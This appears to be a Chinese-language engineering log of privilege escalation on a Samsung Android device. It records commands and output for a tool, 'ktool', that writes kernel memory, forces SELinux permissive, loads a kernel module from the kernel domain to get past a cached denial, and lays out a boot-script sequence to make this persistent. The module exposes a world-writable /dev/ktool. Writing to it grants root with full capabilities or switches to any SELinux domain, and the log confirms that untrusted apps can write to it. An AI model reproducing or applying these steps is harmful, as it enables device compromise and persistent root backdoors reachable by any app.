## 3. 新发现：`insmod` 必须从 kernel 域做，不能从 shell 域

### 3.1 过程

```
ktool w32 c0c0ae28 2          → c0c0ae28 <= 00000002 (was 00000000)   ✅
insmod ktool_mod_new.ko       → Operation not permitted (EPERM)        ❌
ktool permissive              → permissive_map 全 1                    ✅
insmod ktool_mod_new.ko       → 还是 EPERM                              ❌
```

permissive 之后仍然失败，说明不是「当前这一刻被 SELinux 拒」，而是**缓存**。

### 3.2 根因

```
sepolicy_rules.txt 里 "load_module" 出现次数：0
```

**本策略没有任何域被 allow `security:load_module`**。Samsung 直接把模块加载封死了。

第一次 `insmod` 在 shell 域被拒 → AVC 缓存 `(shell_t, kernel_t, security, load_module) = DENIED`。
`permissive_map` 的改动**不会刷新已存在的 AVC 节点**（`avd->flags` 在节点创建时就算好），
所以第二次、第三次都命中同一个 DENIED。

### 3.3 解法：换一个没被检查过的三元组

```
ktool pwn /system/bin/insmod /data/local/tmp/ktool_mod_new.ko
  → kernel 域（uid 0 + full caps + permissive）
  → (kernel_t, kernel_t, security, load_module) 是全新三元组
  → 新节点读 permissive_map → PERMISSIVE → 放行
```

结果：

```
crw-rw-rw- root root 10, 18 /dev/ktool
ktool_mod 3241 0 - Live 0x00000000 (O)
dmesg: ktool: isec_off=36 null=e5597d80 ktool=e554a4e0
       ktool: loaded (/dev/ktool)
```

### 3.4 对 2a 的影响（重要）

原计划「在 `init.sec.boot.sh` 末尾追加 `insmod`」**不成立**——那个脚本跑在 `init_shell` 域，
会撞上同一个缓存拒绝。

正确顺序必须是：

```sh
/system/bin/ktool w32 c0c0ae28 2                                  # bootmode = 2
/system/bin/ktool permissive                                       # permissive_map 全 1
/system/bin/ktool pwn /system/bin/insmod /system/lib/modules/ktool_mod.ko   # kernel 域加载
```

`ktool pwn` 内部会再跑一次 exploit（与 `w32`/`permissive` 各跑一次重复），
但每次约 5–10 s，可接受。若嫌慢，可给 ktool 加一个 `insmod` 子命令
（内部 `do_root` + `init_module` syscall），省掉两次 exec。

## 4. `ish` 实测

```
$ sh -c 'echo ish > /dev/ktool; id; cat /proc/self/attr/current'
uid=0(root) gid=0(root) context=u:r:init_shell:s0
u:r:init_shell:s0
```

能力探针（`src/ish_probe.sh`）：

```
[0] context: u:r:init_shell:s0
[1] id: uid=0(root) gid=0(root) context=u:r:init_shell:s0
[2] write /data/local/tmp: OK
[3] write /data/system: OK
[4] exec sh: uid=0(root) gid=0(root) context=u:r:init_shell:s0
[5] read settings.db: OK
[6] caps: CapInh=0  CapPrm/CapEff/CapBnd=ffffffffffffffff
DONE
```

第 3 项是关键：`shell` 域写不了 `/data/system`，`init_shell` 能。
第 5 项直接验证了 P4.12 续十一那条「属性广播把 read 加回来」的推导——**真机成立**。

## 5. `ctx` 命令与 3b

新增模块命令：

```
echo "ctx u:r:untrusted_app:s0" > /dev/ktool
```

只换 SELinux 域（`prepare_creds()` 复制当前 cred，改 `security->sid`），保留 uid/caps。
比装一个 debuggable APK 快得多，而 SELinux 检查只看 scontext，结论等价。

验证（enforcing 下，permissive_map 已清）：

```
$ sh -c '
    echo "ctx u:r:untrusted_app:s0" > /dev/ktool
    echo A=$(cat /proc/self/attr/current)
    echo "ctx u:r:shell:s0" > /dev/ktool && echo BACK_OK || echo BACK_FAIL
    echo B=$(cat /proc/self/attr/current)'

A=u:r:untrusted_app:s0
BACK_OK
B=u:r:shell:s0
```

`BACK_OK` 就是 3b 的答案：**untrusted_app 域能写 `/dev/ktool`**。
（这里用 `ctx` 命令本身当探针——写进去会让域切回来，能切回来说明写入成功。）

一个保留：这次写入的三元组在更早的 permissive 阶段可能已被缓存为 ALLOWED，
严格说不是"冷缓存下的首次检查"。但策略侧 `allow domain null_device:chr_file {...write}`
+ `null_device ∈ mlstrustedobject` 已独立成立，两条证据不冲突。

## 6. 模块自身的一个诊断 bug（不影响功能）

第一版 `read` 打印 cred 字段：

```
$ cat /dev/ktool
ktool: uid=3362762088 sid=3069726273      ← 0xc86fad68 / 0xb6f84e41
```

都是内核栈地址量级的值。原因：模块的 `.config` 来自 `ja3g_00_defconfig`，
与设备内核实际 config 未必一致，`current_cred()` 的**编译期偏移**可能错位。

但 `commit_creds()` 在内核内部按运行内核的偏移处理，**不受模块偏移影响**——
所以 `ish` / `ctx` 功能正常，只有这个打印不可信。

已改回固定输出 `ktool: ready`。域验证一律用 `/proc/self/attr/current`。

**推论**：以后任何依赖模块内 `current->xxx` 偏移的代码都不可信，
要么用内核函数（`commit_creds`/`prepare_kernel_cred` 这类），要么先实测偏移。
